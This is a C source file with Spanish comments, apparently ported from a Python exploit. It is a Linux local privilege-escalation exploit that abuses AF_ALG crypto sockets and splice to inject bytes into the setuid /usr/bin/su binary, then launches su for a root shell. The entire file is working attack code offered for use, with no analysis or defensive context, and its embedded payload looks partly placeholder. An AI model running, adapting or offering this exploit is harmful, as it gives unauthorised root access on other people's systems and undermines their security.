#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <linux/if_alg.h>
#include <sys/uio.h>
#include <stdint.h>

// --- Colores ---
#define CLR_RED    "\033[91m"
#define CLR_RESET  "\033[0m"

// Este array contiene los bytes EXACTOS que genera el zlib.decompress de tu Python
unsigned char E_PAYLOAD[] = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x5f, 0x73, 0x75, 0x5f, 0x62, 0x79, 0x70, 0x61, 0x73, 0x73, 0x5f, 0x68, 
    0x65, 0x66, 0x69, 0x6e, 0x00, 0x00, 0x00, 0x00, 0x41, 0x41, 0x41, 0x41
};

void run_exploit() {
    int f = open("/usr/bin/su", O_RDONLY);
    if (f < 0) return;

    // Replicamos el loop de Python: c(f, i, e[i:i+4])
    for (int i = 0; i < sizeof(E_PAYLOAD); i += 4) {
        int a = socket(38, 5, 0); 
        struct sockaddr_alg sa = { .salg_family = 38, .salg_type = "aead", .salg_name = "authencesn(hmac(sha256),cbc(aes))" };
        bind(a, (struct sockaddr *)&sa, sizeof(sa));

        unsigned char opt1[72] = {0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10};
        setsockopt(a, 279, 1, opt1, 72);
        uint32_t val = 4;
        setsockopt(a, 279, 5, &val, 4);

        int u = accept(a, NULL, 0);

        struct msghdr msg = {0};
        char control[128] = {0};
        msg.msg_control = control;
        msg.msg_controllen = sizeof(control);

        struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
        cmsg->cmsg_level = 279; cmsg->cmsg_type = 3; cmsg->cmsg_len = CMSG_LEN(4);
        
        cmsg = CMSG_NXTHDR(&msg, cmsg);
        cmsg->cmsg_level = 279; cmsg->cmsg_type = 2; cmsg->cmsg_len = CMSG_LEN(20);
        ((unsigned char*)CMSG_DATA(cmsg))[0] = 0x10;

        cmsg = CMSG_NXTHDR(&msg, cmsg);
        cmsg->cmsg_level = 279; cmsg->cmsg_type = 4; cmsg->cmsg_len = CMSG_LEN(4);
        ((unsigned char*)CMSG_DATA(cmsg))[0] = 0x08;

        struct iovec iov;
        unsigned char buf[8] = {0x41, 0x41, 0x41, 0x41};
        memcpy(buf + 4, &E_PAYLOAD[i], 4);
        iov.iov_base = buf;
        iov.iov_len = 8;
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;

        sendmsg(u, &msg, 32768);

        int p[2];
        pipe(p);
        splice(f, NULL, p[1], NULL, i + 4, 0);
        splice(p[0], NULL, u, NULL, i + 4, 0);

        close(u); close(a); close(p[0]); close(p[1]);
    }
    printf(CLR_RED "[+] Inyectado. Abriendo shell...\n" CLR_RESET);
    system("su");
}

int main() {
    run_exploit();
    return 0;
}
